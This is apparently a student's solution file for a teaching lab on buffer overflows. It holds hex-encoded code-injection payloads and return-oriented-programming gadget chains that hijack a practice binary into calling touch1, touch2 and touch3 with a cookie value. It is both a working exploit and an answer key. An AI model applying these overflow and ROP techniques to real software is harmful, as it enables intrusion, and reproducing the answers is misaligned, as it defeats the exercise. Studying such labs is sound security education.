@@ -1,0 +1,60 @@
+/* ----------------code injection buffer overflow attack--------------- */
+
+/* level 1 */
+00 00 00 00 00 00 00 00 
+00 00 00 00 00 00 00 00 
+00 00 00 00 00 00 00 00 
+00 00 00 00 00 00 00 00 
+00 00 00 00 00 00 00 00 
+c0 17 40 00 00 00 00 00 /* the addr of touch1(): 0x4017c0  */
+
+/* level 2 */
+68 ec 17 40 00 48 c7 c7  /* addr: 0x5561dc78 run my code */
+fa 97 b9 59 c3 00 00 00 
+00 00 00 00 00 00 00 00 
+00 00 00 00 00 00 00 00 
+00 00 00 00 00 00 00 00 
+78 dc 61 55 00 00 00 00 /* addr: 0x5561dca0 pop: 0x5561dc78 */
+
+/* level 3 */
+68 fa 18 40 00 48 c7 c7 /* addr:0x5561dc78 run my code */
+a8 dc 61 55 c3 00 00 00 
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00 
+78 dc 61 55 00 00 00 00 /* addr:0x5561dca0 */
+35 39 62 39 39 37 66 61 /* addr:0x5561dca8 val:str(cookie) */
+
+/* ----------------return-oriented programming buffer overflow attack--------------- */
+
+/* level 2 */
+00 00 00 00 00 00 00 00 /* 0x28 bytes */
+00 00 00 00 00 00 00 00 
+00 00 00 00 00 00 00 00 
+00 00 00 00 00 00 00 00 
+00 00 00 00 00 00 00 00 
+ab 19 40 00 00 00 00 00 /* addr of gadget1 */
+fa 97 b9 59 00 00 00 00 /* cookie: 0x59b997fa */
+c5 19 40 00 00 00 00 00 /* addr of gadget2 */
+ec 17 40 00 00 00 00 00 /* addr of touch2(rdi):  */
+
+/* level 3 */
+00 00 00 00 00 00 00 00 /* 0x28 bytes */
+00 00 00 00 00 00 00 00 
+00 00 00 00 00 00 00 00 
+00 00 00 00 00 00 00 00 
+00 00 00 00 00 00 00 00 
+06 1a 40 00 00 00 00 00 /* addr of movq %rbp,%rax */
+c5 19 40 00 00 00 00 00 /* addr of movq %rax,%rdi */
+ab 19 40 00 00 00 00 00 /* addr of pop %rax */
+48 00 00 00 00 00 00 00 /* bias of str addr  */
+dd 19 40 00 00 00 00 00 /* addr of movl %eax,%edx */
+34 1a 40 00 00 00 00 00 /* addr of movl %edx,%ecx  */
+13 1a 40 00 00 00 00 00 /* addr of movl %ecx,%esi */
+d6 19 40 00 00 00 00 00 /* addr of lea (%rdi,rsi,1),%rax */
+c5 19 40 00 00 00 00 00 /* addr of movq %rax,%rdi */
+fa 18 40 00 00 00 00 00 /* addr of touch3(%rdi) */
+35 39 62 39 39 37 66 61 /* str of cookie */
+00 /*  \0 */
+
+
